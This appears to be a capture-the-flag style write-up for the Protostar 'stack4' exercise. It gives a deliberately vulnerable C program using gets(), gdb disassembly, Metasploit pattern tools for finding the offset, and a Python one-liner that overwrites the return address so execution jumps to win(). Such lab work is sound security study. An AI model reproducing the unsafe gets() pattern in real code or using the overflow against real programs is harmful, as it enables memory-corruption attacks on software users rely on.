Source code:
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```

Analysis:

```python
gdb-peda$ info functions 
All defined functions:

File stack4/stack4.c:
11:     int main(int, char **);
6:      void win(void);

Non-debugging symbols:
0x080482bc  _init
0x080482fc  __gmon_start__@plt
0x0804830c  gets@plt
0x0804831c  __libc_start_main@plt
0x0804832c  puts@plt
0x08048340  _start
0x08048370  __do_global_dtors_aux
0x080483d0  frame_dummy
0x08048420  __libc_csu_fini
0x08048430  __libc_csu_init
0x0804848a  __i686.get_pc_thunk.bx
0x08048490  __do_global_ctors_aux
0x080484bc  _fini
gdb-peda$ disassemble win
Dump of assembler code for function win:
   0x080483f4 <+0>:     push   ebp
   0x080483f5 <+1>:     mov    ebp,esp
   0x080483f7 <+3>:     sub    esp,0x18
   0x080483fa <+6>:     mov    DWORD PTR [esp],0x80484e0
   0x08048401 <+13>:    call   0x804832c <puts@plt>
   0x08048406 <+18>:    leave  
   0x08048407 <+19>:    ret    
End of assembler dump.
gdb-peda$ 

```

address of win() : 0x080483f4

Finding the offset.
```bash
msf-pattern_create -l 80
```

![[Pasted image 20210724144440.png]]
```bash
msf-pattern_offset -l 80 -q 0x63413563
```
![[Pasted image 20210724144523.png]]
Exploit:

```bash
python -c "print 'A'*76 +  '\xf4\x83\x04\x08'   " | ./stack4
```

![[Pasted image 20210724144729.png]]